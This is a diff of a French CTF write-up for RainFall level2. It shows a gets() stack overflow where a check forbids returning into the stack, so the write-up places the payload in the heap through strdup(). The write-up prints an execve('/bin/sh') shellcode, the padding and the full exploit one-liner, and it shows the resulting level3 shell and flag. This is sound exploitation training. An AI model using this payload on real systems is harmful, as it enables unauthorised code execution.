@@ -32,9 +32,10 @@ int     main(void)
     return (0);
 }
 ```
+
 - On voit que la fonction p est appeler et elle contient gets comme le niveau precedent on peut donc placer un shellcode en faisant un depassement de tampon, en faisant cela ca ne marche pas.
 
-- donc en desassemnlant p() on voit qu'il y a une verification sur l''instruction and $0xb0000000,%eax qui vérifie si l'adresse de retour pointe vers la pile:
+- En désassemblant p() on voit qu'il y a une vérification qui empêche d'utiliser une adresse de retour pointant vers la stack (plage 0xb0000000 à 0xbfffffff) :
 
 ```bash
 mov    0x4(%ebp),%eax        ; Récupère l'adresse de retour stockée dans la pile
@@ -45,43 +46,54 @@ cmp    $0xb0000000,%eax      ; Compare avec 0xb0000000
 jne    0x8048527             ; Si différent, continue normalement
 ```
 
-
-- Sur Linux, la plage 0xb0000000 à 0xbfffffff correspond typiquement à la zone de la stack
-
 ## Solution
-#### Heap spraying
-* Mettre notre shellcode dans le buffer
-* Laisser strdup() le copier dans la heap
-* Faire pointer l'adresse de retour vers cette copie dans le heap
 
+#### Heap spraying
+
+- Mettre notre shellcode dans le buffer
+- Laisser strdup() le copier dans la heap
+- Faire pointer l'adresse de retour vers cette copie dans le heap
+
+#### Trouver l'adresse du heap
+
+Pour trouver l'adresse où strdup() copie notre buffer, on utilise GDB :
+
+```bash
+(gdb) break strdup
+(gdb) run
+# Entrer quelques caractères de test
+(gdb) next
+(gdb) print $eax
+$1 = 0x804a008  # Adresse où strdup() a copié notre input
+```
 
 #### Construction du payload:
 
 - 1: on place notre shellcode au debut du buffer
 - 2: on rempli le reste du buffer
-- 3: on depasse le buffer pour reecrire l'addresse de retour en mettant l'addresse de notre shellcode:
+- 3: on depasse le buffer pour reecrire l'addresse de retour avec l'addresse du heap (0x804a008)
 
-il faut arriver a l'addresse de retour de la fonction pour ce faire il faut depasser buffer[76] et int memory qui fait 4 octet
-donc 80 octet
+Il faut:
 
-Taille du shelllcode = 21 octet
+- 80 octets pour atteindre l'adresse de retour (76 pour buffer + 4 pour memory)
+- Notre shellcode fait 21 octets
+- Donc on ajoute 59 'a' pour compléter (80 - 21 = 59)
+
+Shellcode (21 octets):
 `\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`
 
-+
-59 a + 21(shellcode) = 80
-`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`
+Padding (59 'a'):
+`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`
 
-+ 
-l'addresse du debut du buffer
-`x08\xa0\x04\x08`
+Adresse du heap:
+`\x08\xa0\x04\x08`
 
 ```bash
 level2@RainFall:~$ (echo -e "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x08\xa0\x04\x08" ; cat -) | ./level2
 j
- X�Rh//shh/bin��1�̀aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�
+ X�Rh//shh/bin��1�̀aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 whoami
 level3
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
-
